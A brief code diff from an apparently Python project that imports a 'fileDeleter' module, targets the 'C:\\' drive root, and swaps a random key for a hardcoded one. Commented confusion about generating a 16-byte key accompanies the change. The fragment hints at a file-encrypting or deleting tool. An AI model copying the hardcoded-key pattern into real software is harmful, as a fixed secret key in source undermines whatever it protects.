@@ -6,8 +6,8 @@ import fileDeleter
 
 
 rootDirectionary = 'C:\\'
-key = random.getrandbits(32) 
-
+key = "0c92c4e1a35551ed366ca52bf12b6037"  #str(random.getrandbits(32)) < this doesnt work
+#I cant find a way to generate a 16 byte key, in python. So im using this for now
 
 
 
